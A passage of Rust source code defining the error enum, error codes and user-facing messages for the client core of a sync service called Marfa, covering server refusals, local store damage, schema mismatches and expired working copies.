use std::path::Path;
use std::time::Duration;

use thiserror::Error;

/// The code the core gives a refusal whose body it could not read.
pub const UNREAD_CODE: &str = "unknown";

/// A server's answer, without the device's interpretation.
#[derive(Debug, Clone, PartialEq)]
pub struct ServerAnswer {
    pub status: u16,
    pub code: Option<String>,
    pub details: Option<serde_json::Value>,
    /// The server's `X-Request-ID`, which a report of a problem can quote.
    pub request_id: Option<String>,
}

impl ServerAnswer {
    pub fn status_only(status: u16) -> Box<Self> {
        Box::new(Self {
            status,
            code: None,
            details: None,
            request_id: None,
        })
    }
}

#[derive(Debug, Clone, PartialEq, Error)]
pub enum CoreError {
    #[error("{}", classified("not found", Some(code), message))]
    NotFound {
        code: String,
        message: String,
        /// `None` means no server answered: the device refused on its own.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("{}", classified("unauthorized", Some(code), message))]
    Unauthorized {
        code: String,
        message: String,
        /// `None` means no server answered: the device refused on its own.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("{}", classified("forbidden", Some(code), message))]
    Forbidden {
        code: String,
        message: String,
        /// `None` means no server answered: the device refused on its own.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("{}", classified("validation", Some(code), message))]
    Validation {
        code: String,
        message: String,
        /// The copy's own details; a server's details belong in `server`.
        details: Option<Box<serde_json::Value>>,
        /// `None` means no server answered: the device refused on its own.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("{}", classified("unknown type", None, message))]
    UnknownType {
        message: String,
        /// `None` means no server answered: the device refused on its own.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("{}", classified("rate limited", Some(code), message))]
    RateLimited {
        code: String,
        message: String,
        retry_after_seconds: Option<u64>,
        details: Option<Box<serde_json::Value>>,
        request_id: Option<String>,
    },
    #[error("server answered {status} ({code}): {message}")]
    Server {
        status: u16,
        code: String,
        message: String,
        details: Option<Box<serde_json::Value>>,
        request_id: Option<String>,
    },
    #[error("{0}")]
    Io(String),
    /// The words are the whole message and do not repeat the code `network`,
    /// which a surface that prints a code beside a message would show twice.
    #[error("{0}")]
    Network(String),
    /// Nothing was listening at the origin.
    #[error("request to {origin} failed: the connection was refused")]
    ConnectionRefused { origin: String },
    /// The server names its contract on every answer, so one naming none is
    /// taken as from something in front of it. Environmental, whatever its
    /// status: a gateway's `401` is not the server's word on the key, nor a
    /// proxy's `404` on a row.
    #[error(
        "{origin} answered {status} naming no contract, taken as from something in front of the server; if it repeats while the server otherwise answers, its refusals are losing the contract header on the way"
    )]
    Unnamed {
        origin: String,
        status: u16,
        retry_after_seconds: Option<u64>,
    },
    #[error("decoding: {0}")]
    Decoding(String),
    /// A failed credential callback says nothing about the queued request.
    /// Client boundaries expose the cause; drain preserves this provenance.
    #[error("{0}")]
    RenewalFailed(Box<CoreError>),
    /// The app's renewer could not renew and said why, which is neither the
    /// sign-in ending nor the network failing. Not environmental, not signed
    /// out, and the queued writes stay queued.
    #[error("{message}")]
    RenewalRefused {
        reason: RenewalFailure,
        message: String,
    },
    #[error("signed out of {origin}: sign in again")]
    SignedOut { origin: String },
    #[error("credential storage is unavailable: {0}")]
    NoKeychain(String),
    #[error("local storage is full: {0}")]
    StorageFull(String),
    #[error("store: {0}")]
    Store(String),
    /// Store contention that a fresh transaction may clear.
    #[error("the store is busy with another program's write: {0}")]
    StoreBusy(String),
    #[error("{origin} answered {status}, a redirect to {}", location.as_deref().unwrap_or("nowhere it named"))]
    Redirected {
        origin: String,
        status: u16,
        location: Option<String>,
    },
    #[error("no server configured for this call")]
    NoServer,
    #[error("no event cursor stored; hydrate first")]
    NoCursor,
    #[error(
        "the working copy is not whole: wait for the hydration under way to complete, or hydrate again"
    )]
    HydrationIncomplete,
    #[error("this working copy has never held the server's type catalog; hydrate first")]
    NoCatalog,
    #[error(
        "this is a reading handle: another process holds the writer handle for this store, and one store has one writer"
    )]
    ReadingHandle,
    /// A handle opened to read only, so no other process need hold the writer.
    #[error("this handle was opened to read only, so it cannot write")]
    OpenedToRead,
    #[error("{}", wrong_schema(path, reason, *unsent, folder.as_ref(), release.as_deref()))]
    WrongSchema {
        path: String,
        reason: String,
        /// Writes in the store the server has not taken, waiting, blocked,
        /// refused or dead. In a folder's store, the writes still to be sent,
        /// each dead write, each refused write but one of a change the folder
        /// records against a file to an item a file is bound to, and each
        /// answered write a file's state still waits on. `None` where they
        /// cannot be read.
        unsent: Option<u64>,
        /// Where the store is a folder's, what this build's folder commands
        /// can do with it.
        folder: Option<FolderStore>,
        /// The release that last opened the store as its writer; `None` where
        /// the store records none.
        release: Option<String>,
    },
    /// A store SQLite cannot read, whole or in part, or one whose set-aside
    /// stopped part way.
    #[error("{}", store_damaged(path, reason, *unsent))]
    StoreDamaged {
        /// Empty where the damage was met part way through a read, which
        /// does not know the store's path: `Core::check_store` names it.
        path: String,
        reason: String,
        /// Writes in its queue the server has not taken, as `WrongSchema`
        /// counts them; `None` where the queue cannot be read whole.
        unsent: Option<u64>,
        /// True while a file stands at the set-aside's name, which blocks
        /// removal and replacement whether a set-aside left it or not.
        set_aside_stopped: bool,
    },
    /// A removal of a store was refused, leaving it as it was, because the
    /// writes it holds that the server has not taken are not those the
    /// confirmation was given with.
    #[error("{}", unsent_differs(path, *unsent))]
    UnsentDiffers {
        path: String,
        /// How many writes the store holds that the server has not taken;
        /// `None` where they cannot be read.
        unsent: Option<u64>,
    },
    /// The cursor is dropped, so the copy reports itself expired until a
    /// hydration, which keeps the queue.
    #[error("{}", copy_expired(reason))]
    CopyExpired {
        reason: String,
        /// The server's answer, where one ended the copy.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("the event stream ended early: {reason}")]
    StreamIncomplete {
        reason: String,
        /// The server's answer, where one was read before the device ended the call.
        server: Option<Box<ServerAnswer>>,
    },
    #[error("this file belongs to {expected}, not {got}")]
    WrongServer { expected: String, got: String },
    #[error("the bytes of {hash} are not held here and cannot be fetched: {reason}")]
    BytesAbsent { hash: String, reason: String },
    #[error(
        "the {size} bytes of {hash} would not fit: {free} bytes are free on the volume that holds the file cache"
    )]
    NoRoom { hash: String, size: u64, free: u64 },
    #[error("{}", contract_mismatch(origin, served.as_deref(), *expected, *status, *write_sent, *refusal))]
    ContractMismatch {
        origin: String,
        served: Option<String>,
        expected: u64,
        status: Option<u16>,
        /// The server acted on a write before its answer could say it speaks
        /// another contract.
        write_sent: bool,
        /// Whether the server itself refused the request for its contract.
        refusal: ContractRefusal,
    },
    /// The server's root names a release older than this core supports.
    #[error(
        "This server runs Marfa {served}. Update the server to Marfa {oldest} or later to use this app."
    )]
    ServerTooOld { served: String, oldest: String },
    /// The caller's stop was raised. What had been taken is consistent: a
    /// hydration left unfinished answers lists and searches marked partial,
    /// and takes writes only to the rows it holds and new ones, and no edge writes, until a hydration completes (the next one of the same slice carries on from the page it reached where it can), a catch-up keeps the cursor it reached, and a drain leaves what it had not sent queued, and an
    /// upload or keyed write it had in flight queued as sent, under its key,
    /// for the next drain to send again.
    #[error("the operation was stopped before it finished")]
    Canceled,
    #[error(
        "this folder's first sync waits for confirmation, and nothing is written or sent until it is given: `folders push` says what it will do, `folders confirm` lets it go, and `folders remove` drops it"
    )]
    FirstSyncWaiting,
    #[error(
        "this directory's sync is paused, so nothing is sent or written until `folders resume` lets it go on"
    )]
    SyncPaused,
    #[error("{0}")]
    Invalid(String),
    /// The working copy lacks the edges or items needed for a link count.
    #[error("{0}")]
    NotAnswerable(String),
    /// The core, or a caller's code it ran, panicked, and the core caught it
    /// so that its caller is told the work ended. Never the caller's input
    /// or the server's answer: the core itself went wrong.
    #[error("{0}")]
    Fault(String),
}

/// Why a renewal failed without ending the sign-in, as a closed set an app
/// can word.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RenewalFailure {
    /// The server refused the renewal and the sign-in still stands, as with
    /// `invalid_request`, `invalid_scope` or `unauthorized_client`.
    Refused,
    /// The token endpoint answered a redirect, which is not followed.
    Redirected,
    /// The answer could not be read, or the server is not a sign-in server.
    Unreadable,
}

/// One list drives the match and the set of codes, so a variant added to
/// `CoreError` fails to compile until it has a code, and the code then joins
/// `CODES`, which the command line's help is held to list.
macro_rules! codes {
    ($($kind:ident: $pattern:pat => $code:literal,)*) => {
        /// Every code `CoreError::code` answers, each once.
        pub const CODES: &[&str] = &[$($code),*];

        /// The classification a binding retains when it carries different
        /// fields from `CoreError`. Its code comes from the core's one list.
        #[derive(Debug, Clone, Copy, PartialEq, Eq)]
        pub enum CoreErrorKind {
            $($kind,)*
        }

        impl CoreErrorKind {
            pub fn code(self) -> &'static str {
                match self {
                    $(Self::$kind => $code,)*
                }
            }
        }

        impl CoreError {
            pub fn kind(&self) -> CoreErrorKind {
                match self {
                    CoreError::RenewalFailed(cause) => cause.kind(),
                    $($pattern => CoreErrorKind::$kind,)*
                }
            }

            /// What a surface names the error by: the same word in the command
            /// line's envelope, in a Node error and anywhere else one is named.
            /// A failed renewal answers the code of its cause, as it carries
            /// the cause's refusal.
            pub fn code(&self) -> &'static str {
                self.kind().code()
            }
        }
    };
}

codes! {
    NotFound: CoreError::NotFound { .. } => "not_found",
    Unauthorized: CoreError::Unauthorized { .. } => "unauthorized",
    Forbidden: CoreError::Forbidden { .. } => "forbidden",
    Validation: CoreError::Validation { .. } => "validation",
    UnknownType: CoreError::UnknownType { .. } => "unknown_type",
    RateLimited: CoreError::RateLimited { .. } => "rate_limited",
    Server: CoreError::Server { .. } => "server",
    Io: CoreError::Io(_) => "io",
    Network: CoreError::Network(_) | CoreError::ConnectionRefused { .. } => "network",
    Unnamed: CoreError::Unnamed { .. } => "unnamed_answer",
    Decoding: CoreError::Decoding(_) => "decoding",
    Store: CoreError::Store(_) => "store",
    StoreBusy: CoreError::StoreBusy(_) => "store_busy",
    StorageFull: CoreError::StorageFull(_) => "storage_full",
    SignedOut: CoreError::SignedOut { .. } => "signed_out",
    NoKeychain: CoreError::NoKeychain(_) => "no_keychain",
    Redirected: CoreError::Redirected { .. } => "redirect",
    NoServer: CoreError::NoServer => "no_server",
    NoCursor: CoreError::NoCursor => "no_cursor",
    HydrationIncomplete: CoreError::HydrationIncomplete => "hydration_incomplete",
    NoCatalog: CoreError::NoCatalog => "no_catalog",
    ReadingHandle: CoreError::ReadingHandle | CoreError::OpenedToRead => "reading_handle",
    WrongSchema: CoreError::WrongSchema { .. } => "wrong_schema",
    StoreDamaged: CoreError::StoreDamaged { .. } => "store_damaged",
    UnsentDiffers: CoreError::UnsentDiffers { .. } => "unsent_differs",
    CopyExpired: CoreError::CopyExpired { .. } => "copy_expired",
    StreamIncomplete: CoreError::StreamIncomplete { .. } => "stream_incomplete",
    WrongServer: CoreError::WrongServer { .. } => "wrong_server",
    BytesAbsent: CoreError::BytesAbsent { .. } => "bytes_absent",
    NoRoom: CoreError::NoRoom { .. } => "no_room",
    ContractMismatch: CoreError::ContractMismatch { .. } => "contract_mismatch",
    ServerTooOld: CoreError::ServerTooOld { .. } => "server_too_old",
    Canceled: CoreError::Canceled => "canceled",
    FirstSyncWaiting: CoreError::FirstSyncWaiting => "first_sync_waiting",
    SyncPaused: CoreError::SyncPaused => "sync_paused",
    RenewalRefused: CoreError::RenewalRefused { .. } => "renewal_refused",
    Invalid: CoreError::Invalid(_) => "invalid",
    NotAnswerable: CoreError::NotAnswerable(_) => "not_answerable",
    Fault: CoreError::Fault(_) => "fault",
}

/// A local refusal that says nothing about whether the server holds the row.
pub const NOT_HELD: &str = "not_held";

fn classified(kind: &str, code: Option<&str>, message: &str) -> String {
    if message.to_lowercase().starts_with(&format!("{kind}:")) {
        return message.into();
    }
    let classification = match code.filter(|code| code.replace('_', " ") != kind) {
        Some(code) => format!("{kind} ({code})"),
        None => kind.into(),
    };
    if message.is_empty() {
        classification
    } else {
        format!("{classification}: {message}")
    }
}

impl CoreError {
    /// A call that panicked held the connection's lock, so the core itself
    /// went wrong and every later call on it is a fault.
    pub(crate) fn poisoned() -> Self {
        CoreError::Fault("the connection was poisoned by an earlier panic".into())
    }

    pub fn not_held(message: impl Into<String>) -> Self {
        CoreError::NotFound {
            code: NOT_HELD.into(),
            message: message.into(),
            server: None,
        }
    }

    /// A copy that ended for `reason` without a server's answer.
    pub fn expired(reason: impl Into<String>) -> Self {
        CoreError::CopyExpired {
            reason: reason.into(),
            server: None,
        }
    }

    #[cfg(test)]
    pub(crate) fn expired_by(reason: &str, status: u16, code: &str) -> Self {
        CoreError::CopyExpired {
            reason: reason.into(),
            server: Some(Box::new(ServerAnswer {
                status,
                code: Some(code.into()),
                details: None,
                request_id: None,
            })),
        }
    }

    /// This error, naming the answer of the server that caused it.
    pub(crate) fn told_by(mut self, answer: Option<Box<ServerAnswer>>) -> Self {
        if let CoreError::CopyExpired { server, .. } | CoreError::StreamIncomplete { server, .. } =
            &mut self
        {
            *server = answer;
        }
        self
    }

    /// The device's code and details, where no server sent that code.
    pub fn local(&self) -> Option<(&str, Option<&serde_json::Value>)> {
        let (code, details) = match self {
            CoreError::RenewalFailed(cause) => return cause.local(),
            CoreError::NotFound { code, .. }
            | CoreError::Unauthorized { code, .. }
            | CoreError::Forbidden { code, .. } => (code.as_str(), None),
            CoreError::Validation { code, details, .. } => (code.as_str(), details.as_deref()),
            CoreError::UnknownType { .. } => ("unknown_type", None),
            _ => return None,
        };
        let said = self.answer().and_then(|answer| answer.code);
        (said.as_deref() != Some(code)).then_some((code, details))
    }

    /// The server's answer, independent of the device's classification.
    pub fn answer(&self) -> Option<ServerAnswer> {
        match self {
            CoreError::RenewalFailed(cause) => cause.answer(),
            CoreError::NotFound { server, .. }
            | CoreError::Unauthorized { server, .. }
            | CoreError::Forbidden { server, .. }
            | CoreError::Validation { server, .. }
            | CoreError::UnknownType { server, .. }
            | CoreError::CopyExpired { server, .. }
            | CoreError::StreamIncomplete { server, .. } => server.as_deref().cloned(),
            CoreError::RateLimited {
                code,
                details,
                request_id,
                ..
            } => Some(ServerAnswer {
                status: 429,
                code: (code != UNREAD_CODE).then(|| code.clone()),
                details: details.as_deref().cloned(),
                request_id: request_id.clone(),
            }),
            CoreError::Server {
                status,
                code,
                details,
                request_id,
                ..
            } => Some(ServerAnswer {
                status: *status,
                code: (code != UNREAD_CODE).then(|| code.clone()),
                details: details.as_deref().cloned(),
                request_id: request_id.clone(),
            }),
            CoreError::Unnamed { status, .. } | CoreError::Redirected { status, .. } => {
                Some(*ServerAnswer::status_only(*status))
            }
            CoreError::ContractMismatch {
                status: Some(status),
                ..
            } => Some(*ServerAnswer::status_only(*status)),
            _ => None,
        }
    }

    /// An error that must reach the caller even when processing a single file.
    pub fn is_copy_wide(&self) -> bool {
        matches!(
            self,
            CoreError::CopyExpired { .. }
                | CoreError::StreamIncomplete { .. }
                | CoreError::Canceled
        )
    }

    /// Whether asking again can clear it. A 404 or a 405 cannot: it may come
    /// from a server that is not Marfa's.
    pub fn is_environmental(&self) -> bool {
        match self {
            CoreError::RenewalFailed(cause) => cause.is_environmental(),
            CoreError::Io(_)
            | CoreError::StorageFull(_)
            | CoreError::Network(_)
            | CoreError::ConnectionRefused { .. }
            | CoreError::RateLimited { .. }
            | CoreError::Unnamed { .. } => true,
            CoreError::Server { status, .. } => environmental_status(*status),
            _ => false,
        }
    }

    /// Whether the sign-in this call used has ended, so only a new one lets it
    /// through.
    pub fn is_signed_out(&self) -> bool {
        match self {
            CoreError::RenewalFailed(cause) => cause.is_signed_out(),
            CoreError::SignedOut { .. } => true,
            _ => false,
        }
    }

    /// Whether the server could not be reached or answered with its own
    /// trouble: the network, a timeout, a rate limit or a `5xx`. A full disk
    /// or a local read or write that failed is environmental but is not the
    /// server being unavailable.
    pub fn is_unreachable(&self) -> bool {
        match self {
            CoreError::RenewalFailed(cause) => cause.is_unreachable(),
            CoreError::Network(_)
            | CoreError::ConnectionRefused { .. }
            | CoreError::RateLimited { .. } => true,
            CoreError::Server { status, .. } | CoreError::Unnamed { status, .. } => {
                matches!(status, 408 | 429 | 500..=599)
            }
            _ => false,
        }
    }

    /// Whether the server answered `429`, which the renewal of a credential may
    /// have met.
    pub fn is_rate_limited(&self) -> bool {
        match self {
            CoreError::RenewalFailed(cause) => cause.is_rate_limited(),
            CoreError::RateLimited { .. } | CoreError::Unnamed { status: 429, .. } => true,
            CoreError::Server { status, .. } => *status == 429,
            _ => false,
        }
    }

    /// Whether the server itself limited the request: a `429` naming the
    /// contract, not one from something in front of it.
    pub fn is_limit_named(&self) -> bool {
        match self {
            CoreError::RenewalFailed(cause) => cause.is_limit_named(),
            CoreError::RateLimited { .. } => true,
            CoreError::Server { status, .. } => *status == 429,
            _ => false,
        }
    }

    pub fn retry_after(&self) -> Option<Duration> {
        match self {
            CoreError::RenewalFailed(cause) => cause.retry_after(),
            CoreError::RateLimited {
                retry_after_seconds: Some(seconds),
                ..
            }
            | CoreError::Unnamed {
                status: 429,
                retry_after_seconds: Some(seconds),
                ..
            } => Some(Duration::from_secs(*seconds).min(RETRY_AFTER_MOST)),
            _ => None,
        }
    }
}

/// A status the same request may be answered past: `408` says a body did not
/// arrive in time, which is about the network, `425` asks for the same request again, and a `5xx` is
/// the server's own trouble, which the server reports itself.
pub fn environmental_status(status: u16) -> bool {
    matches!(status, 408 | 425 | 500..=599)
}

/// Past this a server could park the client indefinitely. The server's webhook
/// delivery honors the same bound.
pub(crate) const RETRY_AFTER_MOST: Duration = Duration::from_secs(300);

/// What the server said of a request that named another contract than its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ContractRefusal {
    /// The server's answer was on another contract, so nothing it said was read.
    Unread,
    /// The server refused this attempt with `412 contract_mismatch`, before it acted.
    Declined,
    /// As `Declined`, for a write an earlier attempt of which was sent under
    /// the same key, whose outcome stays unknown.
    DeclinedAfterEarlierAttempt,
}

fn contract_mismatch(
    origin: &str,
    served: Option<&str>,
    expected: u64,
    status: Option<u16>,
    write_sent: bool,
    refusal: ContractRefusal,
) -> String {
    let sent = match refusal {
        ContractRefusal::Declined => ". The server refused this attempt before it acted",
        ContractRefusal::DeclinedAfterEarlierAttempt => {
            ". The server refused this attempt before it acted, and the outcome of an earlier attempt of this write, sent under the same key, stays unknown, so it stays queued with no verdict"
        }
        ContractRefusal::Unread if write_sent => {
            ". The write was sent and may have taken effect, and it stays queued with no verdict"
        }
        ContractRefusal::Unread => "",
    };
    let answered = status.map_or_else(
        || "answered".to_string(),
        |status| format!("answered {status}"),
    );
    match served {
        Some(served) => format!(
            "{origin} {answered} on contract {served}, and this build of the core speaks contract {expected}, so the answer was not read: use a build for the server's contract{sent}"
        ),
        // Nothing here says the answer came from a Marfa server at all: a
        // captive portal or a mistyped URL answers the same way.
        None => format!(
            "{origin} {answered} naming no contract, so it may not be a Marfa server: check the URL. This build of the core speaks contract {expected}{sent}"
        ),
    }
}

/// What this build's folder commands can do with a folder's store that
/// another build of the core made, once it holds nothing unsent.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum FolderStore {
    /// It names the folder and is at a version this build's writer upgrades
    /// in place, so the folder's next push, pull, scan or watch upgrades it,
    /// keeping everything it holds.
    Upgradable,
    /// It names the folder and every table of the folder's own is of this
    /// build's shape, so the folder's next push, pull, scan or watch replaces
    /// it, carrying them.
    Replaceable,
    /// It names no folder, so only `folders add` replaces it.
    Unnamed,
    /// The named table of the folder's own, or what it records, is of
    /// another shape, so this build cannot carry it.
    Uncarried(String),
}

/// How a refusal names the build that last saved a store, from the release
/// the store records. A build no release stamped records `0.0.0`, which is
/// nothing to install.
enum SavedBy<'a> {
    Release(&'a str),
    Development,
    Unknown,
}

impl<'a> SavedBy<'a> {
    /// A text that is not a release as the stamp writes one is not known: the
    /// store holds any text, and a message puts it in a command to run.
    fn of(release: Option<&'a str>) -> Self {
        match release.filter(|release| crate::store::is_release(release)) {
            Some(crate::store::DEVELOPMENT_RELEASE) => SavedBy::Development,
            Some(release) => SavedBy::Release(release),
            None => SavedBy::Unknown,
        }
    }

    fn named(&self) -> String {
        match self {
            SavedBy::Release(release) => format!("last saved by release {release}"),
            SavedBy::Development => "last saved by a development build".to_string(),
            SavedBy::Unknown => "the release that last saved it is not known".to_string(),
        }
    }

    /// The first mention of the build that made a folder's saved state, where
    /// a person is sent to it.
    fn build(&self) -> String {
        match self {
            SavedBy::Release(release) => format!(
                "with release {release}, the build that made it (install it with `MARFA_VERSION={release}` and the install script)"
            ),
            _ => "with the build that made it".to_string(),
        }
    }
}

/// Whether release `recorded` is earlier than release `this`, both as the
/// stamp writes them.
fn is_earlier(recorded: &str, this: &str) -> bool {
    let numbers = |release: &str| -> Option<Vec<u64>> {
        release.split('.').map(|part| part.parse().ok()).collect()
    };
    matches!((numbers(recorded), numbers(this)), (Some(recorded), Some(this)) if recorded < this)
}

/// Never advises deleting the store: only the build that made it can send
/// what it holds.
fn wrong_schema(
    path: &str,
    reason: &str,
    unsent: Option<u64>,
    folder: Option<&FolderStore>,
    release: Option<&str>,
) -> String {
    wrong_schema_from(crate::store::RELEASE, path, reason, unsent, folder, release)
}

/// `wrong_schema` for a build made as release `this`.
fn wrong_schema_from(
    this: &str,
    path: &str,
    reason: &str,
    unsent: Option<u64>,
    folder: Option<&FolderStore>,
    release: Option<&str>,
) -> String {
    let saved = SavedBy::of(release);
    if let Some(folder) = folder {
        return refused_directory(path, reason, unsent, folder, &saved);
    }
    let writes = |count: u64| if count == 1 { "write" } else { "writes" };
    let (install, until) = match &saved {
        SavedBy::Release(release) => (
            format!(
                "; install release {release} (`MARFA_VERSION={release}` with the install script) to open it"
            ),
            if is_earlier(release, this) {
                ", and upgrade again only once it holds none"
            } else {
                ", and use that release until it holds none"
            },
        ),
        _ => (String::new(), ""),
    };
    let holds = match unsent {
        Some(0) => "Every write it holds the server has taken, so a store hydrated in its place loses nothing".to_string(),
        Some(count) => format!(
            "It holds {count} {} the server has not taken, waiting, blocked, refused or dead, which only the build that made it can send: list them (`marfa device unsent`, or `readUnsent` in a binding), and open it with that build to drain or discard them before hydrating a new store{install}{until}",
            writes(count)
        ),
        None => format!(
            "Whether it holds writes the server has not taken cannot be read: open it with the build that made it and drain or discard them before hydrating a new store{install}{until}"
        ),
    };
    format!(
        "{path} was made by another build of the core ({}): {reason}. {holds}",
        saved.named()
    )
}

/// A directory's saved state that another build made. Never advises deleting
/// it: only that build can send what it holds.
fn refused_directory(
    path: &str,
    reason: &str,
    unsent: Option<u64>,
    folder: &FolderStore,
    saved: &SavedBy<'_>,
) -> String {
    let state = Path::new(path);
    let directory = state
        .parent()
        .filter(|parent| {
            parent
                .file_name()
                .is_some_and(|name| name == crate::folder::STATE_DIR)
        })
        .and_then(Path::parent)
        .map_or(path.to_string(), |root| root.display().to_string());
    let changes = |count: u64| if count == 1 { "change" } else { "changes" };
    let build = saved.build();
    let holds = match (unsent, folder) {
        (_, FolderStore::Upgradable) => "The directory's next push, pull, scan or watch upgrades it in place to the shape this build reads, keeping everything it records and changing none of the directory's files, so nothing needs to be removed or added again; until then, a command that only reads the directory, such as `marfa folders status`, cannot read it".to_string(),
        (Some(0), FolderStore::Replaceable) => "Nothing in it waits to be sent and no answer from the server is yet to be recorded, so the next push, pull, scan or watch replaces it with saved state this build reads, keeps what is recorded of each file, and fills it again from the server; the replacement changes none of the directory's files".to_string(),
        (Some(0), FolderStore::Unnamed) => "Nothing in it waits to be sent, but it does not say which folder the directory follows, so no push, pull, scan or watch replaces it: add the directory again (`marfa folders add`), which replaces it".to_string(),
        (Some(0), FolderStore::Uncarried(table)) => format!(
            "Nothing in it waits to be sent and no answer from the server is yet to be recorded, but its table {table}, part of what is recorded of the directory's files, is in a shape this build cannot keep, so this build leaves it and the directory's files as they are: {build}, stop the directory following its folder (`marfa folders remove`, which leaves its files), then add it again (`marfa folders add`) with this build"
        ),
        (Some(count), FolderStore::Replaceable) => format!(
            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`, after `marfa folders confirm` where its first sync waits), and once nothing waits, this build replaces it. A change the server refused or gave up on that the push leaves goes only when the directory stops following its folder: with the build that made it, run `marfa folders remove` (which leaves its files), then add the directory again (`marfa folders add`) with this build. The removal drops that change, so a file whose deletion the server never took comes back when the directory is added again, and must be deleted again",
            changes(count)
        ),
        (Some(count), _) => format!(
            "It holds {count} {} still to be sent or whose answer from the server is yet to be recorded, which only the build that made it can send or record, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build",
            changes(count)
        ),
        (None, _) => format!(
            "Whether it holds changes still to be sent cannot be read, so this build leaves it and the directory's files as they are: {build}, push the folder (`marfa folders push`) and stop the directory following its folder (`marfa folders remove`, which leaves its files), then add the directory again (`marfa folders add`) with this build"
        ),
    };
    format!(
        "The saved state of {directory} was made by another build of marfa ({}): {reason}. {holds}",
        saved.named()
    )
}

/// Never advises deleting the store: a set-aside keeps it, and carries what
/// it can read of its queue.
fn store_damaged(path: &str, reason: &str, unsent: Option<u64>) -> String {
    const SET_ASIDE: &str = "Set it aside (`marfa device set-aside`, or `setAsideDamaged` in a binding), which keeps it under a new name beside it and makes a new store in its place";
    if path.is_empty() {
        return format!(
            "the store cannot be read: {reason}. Check it (`marfa device check`, or `checkStore` in a binding), which names it and counts the writes its queue holds that the server has not taken. {SET_ASIDE}, carrying every write it can read"
        );
    }
    let holds = match unsent {
        Some(0) => format!(
            "Its queue holds no write the server has not taken. {SET_ASIDE}; hydrate the new store to fill it"
        ),
        Some(count) => format!(
            "Its queue holds {count} {} the server has not taken. {SET_ASIDE}, carrying them; they are sent once the new store is hydrated",
            if count == 1 { "write" } else { "writes" }
        ),
        None => format!(
            "Its queue cannot be read whole, so how many writes it holds that the server has not taken is not known. {SET_ASIDE}, carrying every write it can read and naming the ones it cannot"
        ),
    };
    format!("{path} cannot be opened: {reason}. {holds}")
}

fn unsent_differs(path: &str, unsent: Option<u64>) -> String {
    match unsent {
        Some(count) => format!(
            "{path} was not removed: the {count} {} it holds that the server has not taken {} not what the person was shown; read them again, show them to the person and remove it with the new confirmation once they agree",
            if count == 1 { "write" } else { "writes" },
            if count == 1 { "is" } else { "are" },
        ),
        None => format!(
            "{path} was not removed: whether it holds writes the server has not taken cannot be read, so it cannot be known what removing it would lose"
        ),
    }
}

/// What an expired copy says, with the advice that fits why it expired. The
/// reason is a code for the causes the core names and a sentence for the
/// rest, so a person is never shown a bare code, nor the name of an internal
/// step. A rebuild keeps the writes not yet sent.
fn copy_expired(reason: &str) -> String {
    let cause_and_advice = match reason {
        "credential_ended" => {
            "the credential it reads with has ended; sign in or approve this app again, or use a new key, then rebuild the copy from the server (changes not yet sent are kept)".to_string()
        }
        "reach_changed" => "what the credential may read, or how the server arranges items and types, has changed; rebuild the copy from the server (changes not yet sent are kept)".to_string(),
        crate::http::INSTANCE_CHANGED => {
            "another Marfa now answers at this address; rebuild the copy from it (changes not yet sent are kept, held until released or withdrawn)".to_string()
        }
        crate::catch_up::CATCHUP_TOO_OLD => "the server's event log no longer holds the point this copy had reached; refill the copy from the server, which keeps what it holds and the changes not yet sent".to_string(),
        "reach_invalid" => "this copy holds no proof it can accept of what the credential may read; rebuild the copy from the server".to_string(),
        "slice_changed" => "the types, tier or edge types asked for are not the ones it holds, so it cannot be filled again in place; rebuild the copy from the server (changes not yet sent are kept)".to_string(),
        "head_past_log" => "the server's event log ends before the point this copy had reached, as after a restore from a backup, so it cannot be filled again in place; rebuild the copy from the server (changes not yet sent are kept)".to_string(),
        crate::hydrate::NOT_STALE => {
            return format!(
                "this working copy is not waiting to be filled again in place ({reason}), so nothing was filled; hydrate it without asking for a fill in place"
            );
        }
        sentence => {
            return format!(
                "this working copy can no longer be kept current: {sentence}; rebuild the copy from the server"
            );
        }
    };
    format!("this working copy can no longer be kept current ({reason}): {cause_and_advice}")
}

impl From<rusqlite::Error> for CoreError {
    fn from(error: rusqlite::Error) -> Self {
        match error.sqlite_error_code() {
            Some(rusqlite::ErrorCode::DiskFull) => CoreError::StorageFull(error.to_string()),
            Some(rusqlite::ErrorCode::DatabaseCorrupt | rusqlite::ErrorCode::NotADatabase) => {
                crate::damage::note_met();
                CoreError::StoreDamaged {
                    path: String::new(),
                    reason: error.to_string(),
                    unsent: None,
                    set_aside_stopped: false,
                }
            }
            Some(rusqlite::ErrorCode::DatabaseBusy) => CoreError::StoreBusy(error.to_string()),
            _ => CoreError::Store(error.to_string()),
        }
    }
}

impl From<serde_json::Error> for CoreError {
    fn from(error: serde_json::Error) -> Self {
        CoreError::Decoding(error.to_string())
    }
}

/// An answer that does not read, named by where it came from. Serde's text
/// for a value of the wrong type quotes the value, so only a syntax error or
/// a missing field is repeated; another is named by what it fails to be. A
/// position is given where serde knows one: a value already parsed has none.
pub(crate) fn unreadable(what: &str, error: &serde_json::Error) -> CoreError {
    use serde_json::error::Category;
    let why = match error.classify() {
        Category::Data if !error.to_string().starts_with("missing field") => {
            let mut why = String::from("not the shape the contract describes");
            if error.line() > 0 {
                why.push_str(&format!(
                    " at line {} column {}",
                    error.line(),
                    error.column()
                ));
            }
            why
        }
        _ => error.to_string(),
    };
    CoreError::Decoding(format!("{what}: {why}"))
}

impl From<url::ParseError> for CoreError {
    fn from(error: url::ParseError) -> Self {
        CoreError::Invalid(format!("invalid url: {error}"))
    }
}

impl From<marfa_rules::RuleError> for CoreError {
    fn from(error: marfa_rules::RuleError) -> Self {
        use marfa_rules::Code;
        match error.code {
            Code::ValidationError | Code::InvalidProperties | Code::InvalidId => {
                CoreError::Validation {
                    server: None,
                    code: error.code.as_str().into(),
                    message: error.message,
                    details: None,
                }
            }
            Code::UnknownType => CoreError::UnknownType {
                server: None,
                message: error.message,
            },
